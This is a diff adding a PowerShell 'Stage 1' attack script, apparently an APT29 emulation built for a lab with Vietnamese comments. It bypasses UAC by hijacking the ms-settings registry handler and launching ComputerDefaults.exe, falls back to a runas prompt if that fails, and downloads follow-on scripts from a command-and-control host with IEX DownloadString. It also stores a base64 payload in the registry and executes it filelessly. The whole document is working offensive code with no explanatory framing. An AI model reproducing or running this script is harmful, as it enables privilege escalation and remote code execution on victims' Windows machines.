@@ -1,0 +1,116 @@
+# ============================================================
+# STAGE 1 - Self-elevating (UAC bypass + Fileless)
+# ============================================================
+
+function Invoke-Stage1Main {
+    $PublicDir = "C:\Users\Public\apt29"
+    mkdir $PublicDir -Force -EA SilentlyContinue
+    $LogFile = "$PublicDir\stage1.log"
+    function L($m) { "[$(Get-Date -Format 'HH:mm:ss')] $m" | Out-File $LogFile -Append }
+
+    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+    L "========================================"
+    L "STAGE 1 - PID $PID"
+    L "Admin: $isAdmin"
+    L "User: $([Security.Principal.WindowsIdentity]::GetCurrent().Name)"
+    L "========================================"
+
+    if (-not $isAdmin) {
+        L "[!] Khong co quyen Admin, thoat."
+        return
+    }
+
+    $C2 = "http://192.168.56.100:8000"
+
+    # [A] Tai payload
+    L "[A] Tai wmi_setup.ps1 tu C2"
+    try {
+        $PayloadText = (New-Object Net.WebClient).DownloadString("$C2/wmi_setup.ps1")
+        L "  Length: $($PayloadText.Length) chars"
+    } catch {
+        L "  FAIL: $_"
+        return
+    }
+
+    # [B] Ghi Registry
+    L "[B] Ghi payload vao Registry"
+    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($PayloadText))
+    reg add "HKCU\Software\Classes\APT29Stage1" /v Payload /t REG_SZ /d $b64 /f | Out-Null
+    L "  B64 length: $($b64.Length)"
+
+    # [C] Doc lai
+    L "[C] Doc lai tu Registry"
+    $readBack = (Get-ItemProperty 'HKCU:\Software\Classes\APT29Stage1').Payload
+    L "  Read back: $($readBack.Length)"
+    if ($readBack -ne $b64) { L "  MISMATCH!"; return }
+    L "  Verify OK"
+
+    # [D] Decode + Exec
+    L "[D] Decode + chay payload"
+    $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($readBack))
+    L "  Decoded: $($decoded.Length) chars"
+    iex $decoded
+
+    L "[E] HOAN TAT"
+    L "========================================"
+}
+
+function Invoke-UACBypass {
+    $PublicDir = "C:\Users\Public\apt29"
+    mkdir $PublicDir -Force -EA SilentlyContinue
+    $BypassLog = "$PublicDir\uac_bypass.log"
+    function BL($m) { "[$(Get-Date -Format 'HH:mm:ss')] $m" | Out-File $BypassLog -Append }
+
+    $C2 = "http://192.168.56.100:8000"
+    BL "=== UAC BYPASS ATTEMPT - PID $PID ==="
+
+    # Command goi lai chinh stage1 nay trong elevated context
+    $innerCmd = "IEX(New-Object Net.WebClient).DownloadString('$C2/stage1.ps1')"
+    $elevatedCmd = "powershell.exe -NoP -W H -Exec Bypass -Command `"$innerCmd`""
+
+    # ===== THU 1: ComputerDefaults (silent) =====
+    BL "[1] ComputerDefaults silent bypass..."
+    try {
+        $regPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
+        Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -EA SilentlyContinue
+        New-Item $regPath -Force | Out-Null
+        New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force | Out-Null
+        Set-ItemProperty -Path $regPath -Name "(default)" -Value $elevatedCmd -Force
+
+        Start-Process "C:\Windows\System32\ComputerDefaults.exe" -WindowStyle Hidden
+        Start-Sleep -Seconds 5
+
+        Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -EA SilentlyContinue
+        BL "  ComputerDefaults executed"
+    } catch {
+        BL "  ComputerDefaults FAIL: $_"
+    }
+
+    # Kiem tra ket qua
+    Start-Sleep 2
+    $stageLog = Get-Content "$PublicDir\stage1.log" -Raw -EA SilentlyContinue
+    if ($stageLog -match "Admin: True") {
+        BL "[+] SILENT BYPASS OK - elevated process detected"
+        return
+    }
+    BL "[-] Silent bypass khong hieu qua"
+
+    # ===== THU 2: Fallback ShellExecute runas (co prompt) =====
+    BL "[2] Fallback ShellExecute runas (UAC prompt)..."
+    try {
+        Start-Process powershell -Verb RunAs -ArgumentList "-NoP","-Exec","Bypass","-Command",$innerCmd
+        BL "  ShellExecute runas da goi - user can bam Yes"
+    } catch {
+        BL "  ShellExecute FAIL: $_"
+    }
+}
+
+# ============ MAIN ============
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+if ($isAdmin) {
+    Invoke-Stage1Main
+} else {
+    Invoke-UACBypass
+}
